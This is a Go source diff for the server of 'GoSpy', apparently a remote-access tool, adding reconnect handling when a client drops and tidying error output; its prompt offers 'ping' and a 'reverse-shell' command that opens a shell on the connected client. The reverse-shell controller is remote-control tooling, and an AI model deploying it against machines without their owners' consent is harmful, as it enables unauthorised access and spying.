@@ -6,11 +6,11 @@ import (
 	"github.com/c-bata/go-prompt"
 	"github.com/psidex/GoSpy/internal/gospyserver/client"
 	"github.com/psidex/GoSpy/internal/gospyserver/serverprompt"
+	"io"
+	"net"
 	"os"
 	"strings"
 )
-
-// ToDo: What happens if the client drops and/or becomes un-responsive?
 
 const banner = `
    ___     ___             ___                      
@@ -25,48 +25,53 @@ func executor(in string) {
 	in = strings.TrimSpace(in)
 	blocks := strings.Split(in, " ")
 
+	var err error // So the it can be inspected after the switch.
+
 	switch blocks[0] {
-
 	case "exit":
-		fmt.Println("Exiting")
 		os.Exit(0)
-
 	case "ping":
-		resp, err := spyClient.Ping()
+		var resp string
+		resp, err = spyClient.Ping()
 		if err != nil {
-			fmt.Printf("Ping error: %e\n", err)
+			fmt.Printf("Ping error: %s\n", err.Error())
 			break
 		}
 		fmt.Printf("Recv: %s\n", resp)
-
 	case "reverse-shell":
-		err := spyClient.EnterReverseShellRepl()
+		err = spyClient.EnterReverseShellRepl()
 		if err != nil {
-			fmt.Printf("Reverse shell error: %e\n", err)
+			fmt.Printf("Reverse shell error: %s\n", err.Error())
 		}
+	}
 
+	if _, isNetErr := err.(*net.OpError); isNetErr == true || err == io.EOF {
+		fmt.Println("Client dropped, waiting for reconnect...")
+		_ = spyClient.CloseConn()
+		_ = spyClient.WaitForConn()
+		fmt.Println("Successful reconnect from client")
 	}
 }
 
 func main() {
-	address := *flag.String("b", "0.0.0.0:12345", "the address (ip:port) to bind the gospyserver to")
+	fmt.Printf("%s\n\n", banner)
 
-	fmt.Println(banner)
-	fmt.Printf("\nListening on %s\n", address)
+	bindAddr := *flag.String("b", "0.0.0.0:12345", "the address (ip:port) to bind the gospyserver to")
+
+	fmt.Printf("Listening on %s\n", bindAddr)
 	fmt.Println("Waiting for connection from GoSpy client...")
 
-	var err error // So we don't assign a local spyClient using := below.
-	spyClient, err = client.GetGoSpyClient(address)
+	spyClient = client.NewGoSpyClient(bindAddr)
+	err := spyClient.WaitForConn()
 	if err != nil {
-		fmt.Printf("Error when client tried to connect: %e\n", err)
-		os.Exit(0)
+		fmt.Printf("Error listening on given address: %s\n", err.Error())
+		os.Exit(1)
 	}
 
-	fmt.Println("Successful connection")
-	p := prompt.New(
+	fmt.Println("Successful connection from client")
+	prompt.New(
 		executor,
 		serverprompt.Completer,
 		prompt.OptionTitle("GoSpyServer"),
-	)
-	p.Run()
+	).Run()
 }
